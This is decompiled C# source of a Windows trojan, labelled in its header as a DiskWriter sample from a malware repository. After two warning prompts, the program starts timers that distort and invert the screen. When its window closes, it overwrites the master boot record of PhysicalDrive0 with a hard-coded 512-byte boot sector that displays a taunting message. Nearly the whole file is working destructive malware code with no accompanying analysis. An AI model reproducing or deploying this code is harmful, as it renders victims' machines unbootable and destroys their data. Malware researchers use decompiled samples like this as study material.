// Decompiled with JetBrains decompiler
// Type: Kittyez.Form1
// Assembly: Kittyez, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4785398F-CAFC-4EA1-B674-1011A6F7DD93
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.DiskWriter.gen-24efea9b3011f267bdfd19976c7de810749dad63ab4191cf9b1550eb58c065d7.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Kittyez
{
  public class Form1 : Form
  {
    private const uint GenericRead = 2147483648;
    private const uint GenericWrite = 1073741824;
    private const uint GenericExecute = 536870912;
    private const uint GenericAll = 268435456;
    private const uint FileShareRead = 1;
    private const uint FileShareWrite = 2;
    private const uint OpenExisting = 3;
    private const uint FileFlagDeleteOnClose = 1073741824;
    private const uint MbrSize = 512;
    private Random r;
    private Icon icon = Form1.Extract("shell32.dll", 235, true);
    private IContainer components = (IContainer) null;
    private Timer timer1;
    private Timer timer2;
    private Timer timer3;
    private Timer timer4;
    private Timer del_sys;

    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(
      string lpFileName,
      uint dwDesiredAccess,
      uint dwShareMode,
      IntPtr lpSecurityAttributes,
      uint dwCreationDisposition,
      uint dwFlagsAndAttributes,
      IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(
      IntPtr hfile,
      byte[] lpBuffer,
      uint nNumberOfBytesToWrite,
      out uint lpNumberBytesWritten,
      IntPtr lpOverlapped);

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
    private static extern int ExtractIconEx(
      string sFile,
      int iIndex,
      out IntPtr piLargeVersion,
      out IntPtr piSmallVersion,
      int amountIcons);

    [DllImport("user32.dll")]
    private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

    [DllImport("gdi32.dll")]
    private static extern bool StretchBlt(
      IntPtr hdcDest,
      int nXOriginDest,
      int nYOriginDest,
      int nWidthDest,
      int nHeightDest,
      IntPtr hdcSrc,
      int nXOriginSrc,
      int nYOriginSrc,
      int nWidthSrc,
      int nHeightSrc,
      Form1.TernaryRasterOperations dwRop);

    public static Icon Extract(string file, int number, bool largeIcon)
    {
      IntPtr piLargeVersion;
      IntPtr piSmallVersion;
      Form1.ExtractIconEx(file, number, out piLargeVersion, out piSmallVersion, 1);
      try
      {
        return Icon.FromHandle(largeIcon ? piLargeVersion : piSmallVersion);
      }
      catch
      {
        return (Icon) null;
      }
    }

    public Form1()
    {
      this.InitializeComponent();
      this.TransparencyKey = this.BackColor;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are you sure you want to run this program? This is malicious software. Click Yes to continue", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
      {
        this.Close();
        Application.Exit();
      }
      else
        this.Last_Warning();
    }

    public void Last_Warning()
    {
      if (MessageBox.Show("THIS IS THE LAST WARNING!!! IF YOU RUN THIS PROGRAM, YOUR COMPUTER GET A LOT OF DAMAGE!!!", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
      {
        this.Close();
        Application.Exit();
      }
      else
      {
        this.timer1.Start();
        this.timer2.Start();
        this.timer3.Start();
        this.timer4.Start();
      }
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      this.timer1.Stop();
      this.r = new Random();
      if (this.timer1.Interval > 101)
      {
        this.timer1.Interval -= 100;
        IntPtr windowDc = Form1.GetWindowDC(Form1.GetDesktopWindow());
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        int width = bounds.Width;
        bounds = Screen.PrimaryScreen.Bounds;
        int height = bounds.Height;
        Form1.StretchBlt(windowDc, this.r.Next(10), this.r.Next(10), width - this.r.Next(25), height - this.r.Next(25), windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
        Form1.StretchBlt(windowDc, width, 0, -width, height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
        Form1.StretchBlt(windowDc, 0, height, width, -height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
      }
      else if (this.timer1.Interval > 51)
      {
        this.timer1.Interval -= 10;
        IntPtr windowDc = Form1.GetWindowDC(Form1.GetDesktopWindow());
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        int width = bounds.Width;
        bounds = Screen.PrimaryScreen.Bounds;
        int height = bounds.Height;
        Form1.StretchBlt(windowDc, this.r.Next(10), this.r.Next(10), width - this.r.Next(25), height - this.r.Next(25), windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
        Form1.StretchBlt(windowDc, width, 0, -width, height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
        Form1.StretchBlt(windowDc, 0, height, width, -height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
      }
      else
      {
        this.timer1.Interval = 10;
        IntPtr windowDc = Form1.GetWindowDC(Form1.GetDesktopWindow());
        int width = Screen.PrimaryScreen.Bounds.Width;
        int height = Screen.PrimaryScreen.Bounds.Height;
        Form1.StretchBlt(windowDc, this.r.Next(10), this.r.Next(10), width - this.r.Next(25), height - this.r.Next(25), windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
        Form1.StretchBlt(windowDc, width, 0, -width, height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
        Form1.StretchBlt(windowDc, 0, height, width, -height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.SRCCOPY);
      }
      this.timer1.Start();
    }

    private void timer2_Tick(object sender, EventArgs e)
    {
      this.timer2.Stop();
      this.Cursor = new Cursor(Cursor.Current.Handle);
      int x = Cursor.Position.X;
      int y = Cursor.Position.Y;
      using (Graphics graphics = Graphics.FromHdc(Form1.GetWindowDC(IntPtr.Zero)))
        graphics.DrawIcon(this.icon, x, y);
      this.timer2.Start();
    }

    private void timer3_Tick(object sender, EventArgs e)
    {
      this.timer3.Stop();
      this.r = new Random();
      IntPtr windowDc = Form1.GetWindowDC(Form1.GetDesktopWindow());
      int width = Screen.PrimaryScreen.Bounds.Width;
      int height = Screen.PrimaryScreen.Bounds.Height;
      Form1.StretchBlt(windowDc, 0, 0, width, height, windowDc, 0, 0, width, height, Form1.TernaryRasterOperations.NOTSRCCOPY);
      this.timer3.Interval = this.r.Next(5000);
      this.timer3.Start();
    }

    private void timer4_Tick(object sender, EventArgs e)
    {
      this.timer4.Stop();
      this.r = new Random();
      IntPtr windowDc = Form1.GetWindowDC(Form1.GetDesktopWindow());
      int width = Screen.PrimaryScreen.Bounds.Width;
      int height = Screen.PrimaryScreen.Bounds.Height;
      int nWidthSrc;
      int nHeightSrc;
      Form1.StretchBlt(windowDc, this.r.Next(width), this.r.Next(height), nWidthSrc = this.r.Next(500), nHeightSrc = this.r.Next(500), windowDc, 0, 0, nWidthSrc, nHeightSrc, Form1.TernaryRasterOperations.NOTSRCCOPY);
      this.timer4.Interval = this.r.Next(1000);
      this.timer4.Start();
    }

    private void del_sys_Tick(object sender, EventArgs e)
    {
      this.del_sys.Stop();
      byte[] lpBuffer = new byte[512]
      {
        (byte) 235,
        (byte) 0,
        (byte) 49,
        (byte) 192,
        (byte) 142,
        (byte) 216,
        (byte) 252,
        (byte) 184,
        (byte) 18,
        (byte) 0,
        (byte) 205,
        (byte) 16,
        (byte) 190,
        (byte) 36,
        (byte) 124,
        (byte) 179,
        (byte) 9,
        (byte) 232,
        (byte) 2,
        (byte) 0,
        (byte) 235,
        (byte) 254,
        (byte) 183,
        (byte) 0,
        (byte) 172,
        (byte) 60,
        (byte) 0,
        (byte) 116,
        (byte) 6,
        (byte) 180,
        (byte) 14,
        (byte) 205,
        (byte) 16,
        (byte) 235,
        (byte) 245,
        (byte) 195,
        (byte) 79,
        (byte) 104,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 32,
        (byte) 104,
        (byte) 105,
        (byte) 32,
        (byte) 103,
        (byte) 117,
        (byte) 121,
        (byte) 115,
        (byte) 33,
        (byte) 13,
        (byte) 10,
        (byte) 73,
        (byte) 102,
        (byte) 32,
        (byte) 121,
        (byte) 111,
        (byte) 117,
        (byte) 32,
        (byte) 108,
        (byte) 111,
        (byte) 111,
        (byte) 107,
        (byte) 32,
        (byte) 97,
        (byte) 116,
        (byte) 32,
        (byte) 116,
        (byte) 104,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 115,
        (byte) 99,
        (byte) 114,
        (byte) 101,
        (byte) 101,
        (byte) 110,
        (byte) 44,
        (byte) 32,
        (byte) 121,
        (byte) 111,
        (byte) 117,
        (byte) 39,
        (byte) 114,
        (byte) 101,
        (byte) 32,
        (byte) 112,
        (byte) 114,
        (byte) 111,
        (byte) 98,
        (byte) 97,
        (byte) 98,
        (byte) 108,
        (byte) 121,
        (byte) 32,
        (byte) 116,
        (byte) 101,
        (byte) 115,
        (byte) 116,
        (byte) 105,
        (byte) 110,
        (byte) 103,
        (byte) 32,
        (byte) 109,
        (byte) 121,
        (byte) 32,
        (byte) 110,
        (byte) 101,
        (byte) 119,
        (byte) 32,
        (byte) 77,
        (byte) 66,
        (byte) 82,
        (byte) 32,
        (byte) 111,
        (byte) 118,
        (byte) 101,
        (byte) 114,
        (byte) 119,
        (byte) 114,
        (byte) 105,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 84,
        (byte) 104,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 109,
        (byte) 121,
        (byte) 32,
        (byte) 102,
        (byte) 105,
        (byte) 114,
        (byte) 115,
        (byte) 116,
        (byte) 32,
        (byte) 101,
        (byte) 120,
        (byte) 112,
        (byte) 101,
        (byte) 114,
        (byte) 105,
        (byte) 101,
        (byte) 110,
        (byte) 99,
        (byte) 101,
        (byte) 32,
        (byte) 119,
        (byte) 105,
        (byte) 116,
        (byte) 104,
        (byte) 32,
        (byte) 78,
        (byte) 65,
        (byte) 83,
        (byte) 77,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 73,
        (byte) 32,
        (byte) 104,
        (byte) 111,
        (byte) 112,
        (byte) 101,
        (byte) 32,
        (byte) 109,
        (byte) 121,
        (byte) 32,
        (byte) 116,
        (byte) 117,
        (byte) 116,
        (byte) 111,
        (byte) 114,
        (byte) 105,
        (byte) 97,
        (byte) 108,
        (byte) 32,
        (byte) 104,
        (byte) 101,
        (byte) 108,
        (byte) 112,
        (byte) 101,
        (byte) 100,
        (byte) 32,
        (byte) 121,
        (byte) 111,
        (byte) 117,
        (byte) 44,
        (byte) 32,
        (byte) 105,
        (byte) 102,
        (byte) 32,
        (byte) 115,
        (byte) 111,
        (byte) 32,
        (byte) 100,
        (byte) 111,
        (byte) 110,
        (byte) 39,
        (byte) 116,
        (byte) 32,
        (byte) 102,
        (byte) 111,
        (byte) 114,
        (byte) 103,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 97,
        (byte) 98,
        (byte) 111,
        (byte) 117,
        (byte) 116,
        (byte) 32,
        (byte) 108,
        (byte) 105,
        (byte) 107,
        (byte) 101,
        (byte) 44,
        (byte) 32,
        (byte) 115,
        (byte) 117,
        (byte) 98,
        (byte) 32,
        (byte) 97,
        (byte) 110,
        (byte) 100,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 109,
        (byte) 109,
        (byte) 101,
        (byte) 110,
        (byte) 116,
        (byte) 32,
        (byte) 58,
        (byte) 68,
        (byte) 13,
        (byte) 10,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 32,
        (byte) 97,
        (byte) 110,
        (byte) 100,
        (byte) 32,
        (byte) 121,
        (byte) 101,
        (byte) 97,
        (byte) 104,
        (byte) 44,
        (byte) 32,
        (byte) 116,
        (byte) 104,
        (byte) 97,
        (byte) 116,
        (byte) 39,
        (byte) 115,
        (byte) 32,
        (byte) 97,
        (byte) 108,
        (byte) 108,
        (byte) 32,
        (byte) 58,
        (byte) 41,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 66,
        (byte) 116,
        (byte) 119,
        (byte) 44,
        (byte) 32,
        (byte) 100,
        (byte) 111,
        (byte) 32,
        (byte) 117,
        (byte) 32,
        (byte) 108,
        (byte) 105,
        (byte) 107,
        (byte) 101,
        (byte) 32,
        (byte) 116,
        (byte) 104,
        (byte) 97,
        (byte) 116,
        (byte) 32,
        (byte) 110,
        (byte) 105,
        (byte) 99,
        (byte) 101,
        (byte) 32,
        (byte) 98,
        (byte) 108,
        (byte) 117,
        (byte) 101,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 108,
        (byte) 111,
        (byte) 114,
        (byte) 63,
        (byte) 13,
        (byte) 10,
        (byte) 13,
        (byte) 10,
        (byte) 13,
        (byte) 10,
        (byte) 65,
        (byte) 108,
        (byte) 119,
        (byte) 97,
        (byte) 121,
        (byte) 115,
        (byte) 32,
        (byte) 114,
        (byte) 101,
        (byte) 109,
        (byte) 101,
        (byte) 109,
        (byte) 98,
        (byte) 101,
        (byte) 114,
        (byte) 33,
        (byte) 32,
        (byte) 67,
        (byte) 108,
        (byte) 117,
        (byte) 116,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 32,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 104,
        (byte) 101,
        (byte) 114,
        (byte) 101,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 33,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 85,
        (byte) 170
      };
      Form1.WriteFile(Form1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), lpBuffer, 512U, out uint _, IntPtr.Zero);
      Environment.Exit(-1);
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      byte[] lpBuffer = new byte[512]
      {
        (byte) 235,
        (byte) 0,
        (byte) 49,
        (byte) 192,
        (byte) 142,
        (byte) 216,
        (byte) 252,
        (byte) 184,
        (byte) 18,
        (byte) 0,
        (byte) 205,
        (byte) 16,
        (byte) 190,
        (byte) 36,
        (byte) 124,
        (byte) 179,
        (byte) 9,
        (byte) 232,
        (byte) 2,
        (byte) 0,
        (byte) 235,
        (byte) 254,
        (byte) 183,
        (byte) 0,
        (byte) 172,
        (byte) 60,
        (byte) 0,
        (byte) 116,
        (byte) 6,
        (byte) 180,
        (byte) 14,
        (byte) 205,
        (byte) 16,
        (byte) 235,
        (byte) 245,
        (byte) 195,
        (byte) 79,
        (byte) 104,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 32,
        (byte) 104,
        (byte) 105,
        (byte) 32,
        (byte) 103,
        (byte) 117,
        (byte) 121,
        (byte) 115,
        (byte) 33,
        (byte) 13,
        (byte) 10,
        (byte) 73,
        (byte) 102,
        (byte) 32,
        (byte) 121,
        (byte) 111,
        (byte) 117,
        (byte) 32,
        (byte) 108,
        (byte) 111,
        (byte) 111,
        (byte) 107,
        (byte) 32,
        (byte) 97,
        (byte) 116,
        (byte) 32,
        (byte) 116,
        (byte) 104,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 115,
        (byte) 99,
        (byte) 114,
        (byte) 101,
        (byte) 101,
        (byte) 110,
        (byte) 44,
        (byte) 32,
        (byte) 121,
        (byte) 111,
        (byte) 117,
        (byte) 39,
        (byte) 114,
        (byte) 101,
        (byte) 32,
        (byte) 112,
        (byte) 114,
        (byte) 111,
        (byte) 98,
        (byte) 97,
        (byte) 98,
        (byte) 108,
        (byte) 121,
        (byte) 32,
        (byte) 116,
        (byte) 101,
        (byte) 115,
        (byte) 116,
        (byte) 105,
        (byte) 110,
        (byte) 103,
        (byte) 32,
        (byte) 109,
        (byte) 121,
        (byte) 32,
        (byte) 110,
        (byte) 101,
        (byte) 119,
        (byte) 32,
        (byte) 77,
        (byte) 66,
        (byte) 82,
        (byte) 32,
        (byte) 111,
        (byte) 118,
        (byte) 101,
        (byte) 114,
        (byte) 119,
        (byte) 114,
        (byte) 105,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 84,
        (byte) 104,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 109,
        (byte) 121,
        (byte) 32,
        (byte) 102,
        (byte) 105,
        (byte) 114,
        (byte) 115,
        (byte) 116,
        (byte) 32,
        (byte) 101,
        (byte) 120,
        (byte) 112,
        (byte) 101,
        (byte) 114,
        (byte) 105,
        (byte) 101,
        (byte) 110,
        (byte) 99,
        (byte) 101,
        (byte) 32,
        (byte) 119,
        (byte) 105,
        (byte) 116,
        (byte) 104,
        (byte) 32,
        (byte) 78,
        (byte) 65,
        (byte) 83,
        (byte) 77,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 73,
        (byte) 32,
        (byte) 104,
        (byte) 111,
        (byte) 112,
        (byte) 101,
        (byte) 32,
        (byte) 109,
        (byte) 121,
        (byte) 32,
        (byte) 116,
        (byte) 117,
        (byte) 116,
        (byte) 111,
        (byte) 114,
        (byte) 105,
        (byte) 97,
        (byte) 108,
        (byte) 32,
        (byte) 104,
        (byte) 101,
        (byte) 108,
        (byte) 112,
        (byte) 101,
        (byte) 100,
        (byte) 32,
        (byte) 121,
        (byte) 111,
        (byte) 117,
        (byte) 44,
        (byte) 32,
        (byte) 105,
        (byte) 102,
        (byte) 32,
        (byte) 115,
        (byte) 111,
        (byte) 32,
        (byte) 100,
        (byte) 111,
        (byte) 110,
        (byte) 39,
        (byte) 116,
        (byte) 32,
        (byte) 102,
        (byte) 111,
        (byte) 114,
        (byte) 103,
        (byte) 101,
        (byte) 116,
        (byte) 32,
        (byte) 97,
        (byte) 98,
        (byte) 111,
        (byte) 117,
        (byte) 116,
        (byte) 32,
        (byte) 108,
        (byte) 105,
        (byte) 107,
        (byte) 101,
        (byte) 44,
        (byte) 32,
        (byte) 115,
        (byte) 117,
        (byte) 98,
        (byte) 32,
        (byte) 97,
        (byte) 110,
        (byte) 100,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 109,
        (byte) 109,
        (byte) 101,
        (byte) 110,
        (byte) 116,
        (byte) 32,
        (byte) 58,
        (byte) 68,
        (byte) 13,
        (byte) 10,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 32,
        (byte) 97,
        (byte) 110,
        (byte) 100,
        (byte) 32,
        (byte) 121,
        (byte) 101,
        (byte) 97,
        (byte) 104,
        (byte) 44,
        (byte) 32,
        (byte) 116,
        (byte) 104,
        (byte) 97,
        (byte) 116,
        (byte) 39,
        (byte) 115,
        (byte) 32,
        (byte) 97,
        (byte) 108,
        (byte) 108,
        (byte) 32,
        (byte) 58,
        (byte) 41,
        (byte) 46,
        (byte) 13,
        (byte) 10,
        (byte) 66,
        (byte) 116,
        (byte) 119,
        (byte) 44,
        (byte) 32,
        (byte) 100,
        (byte) 111,
        (byte) 32,
        (byte) 117,
        (byte) 32,
        (byte) 108,
        (byte) 105,
        (byte) 107,
        (byte) 101,
        (byte) 32,
        (byte) 116,
        (byte) 104,
        (byte) 97,
        (byte) 116,
        (byte) 32,
        (byte) 110,
        (byte) 105,
        (byte) 99,
        (byte) 101,
        (byte) 32,
        (byte) 98,
        (byte) 108,
        (byte) 117,
        (byte) 101,
        (byte) 32,
        (byte) 99,
        (byte) 111,
        (byte) 108,
        (byte) 111,
        (byte) 114,
        (byte) 63,
        (byte) 13,
        (byte) 10,
        (byte) 13,
        (byte) 10,
        (byte) 13,
        (byte) 10,
        (byte) 65,
        (byte) 108,
        (byte) 119,
        (byte) 97,
        (byte) 121,
        (byte) 115,
        (byte) 32,
        (byte) 114,
        (byte) 101,
        (byte) 109,
        (byte) 101,
        (byte) 109,
        (byte) 98,
        (byte) 101,
        (byte) 114,
        (byte) 33,
        (byte) 32,
        (byte) 67,
        (byte) 108,
        (byte) 117,
        (byte) 116,
        (byte) 116,
        (byte) 101,
        (byte) 114,
        (byte) 32,
        (byte) 105,
        (byte) 115,
        (byte) 32,
        (byte) 104,
        (byte) 101,
        (byte) 114,
        (byte) 101,
        (byte) 46,
        (byte) 46,
        (byte) 46,
        (byte) 33,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 85,
        (byte) 170
      };
      Form1.WriteFile(Form1.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero), lpBuffer, 512U, out uint _, IntPtr.Zero);
      Environment.Exit(-1);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timer1 = new Timer(this.components);
      this.timer2 = new Timer(this.components);
      this.timer3 = new Timer(this.components);
      this.timer4 = new Timer(this.components);
      this.del_sys = new Timer(this.components);
      this.SuspendLayout();
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.timer2.Tick += new EventHandler(this.timer2_Tick);
      this.timer3.Tick += new EventHandler(this.timer3_Tick);
      this.timer4.Tick += new EventHandler(this.timer4_Tick);
      this.del_sys.Interval = 240000;
      this.del_sys.Tick += new EventHandler(this.del_sys_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public enum TernaryRasterOperations
    {
      BLACKNESS = 66, // 0x00000042
      NOTSRCERASE = 1114278, // 0x001100A6
      NOTSRCCOPY = 3342344, // 0x00330008
      SRCERASE = 4457256, // 0x00440328
      DSTINVERT = 5570569, // 0x00550009
      PATINVERT = 5898313, // 0x005A0049
      SRCINVERT = 6684742, // 0x00660046
      SRCAND = 8913094, // 0x008800C6
      MERGEPAINT = 12255782, // 0x00BB0226
      MERGECOPY = 12583114, // 0x00C000CA
      SRCCOPY = 13369376, // 0x00CC0020
      SRCPAINT = 15597702, // 0x00EE0086
      PATCOPY = 15728673, // 0x00F00021
      PATPAINT = 16452105, // 0x00FB0A09
      WHITENESS = 16711778, // 0x00FF0062
    }
  }
}
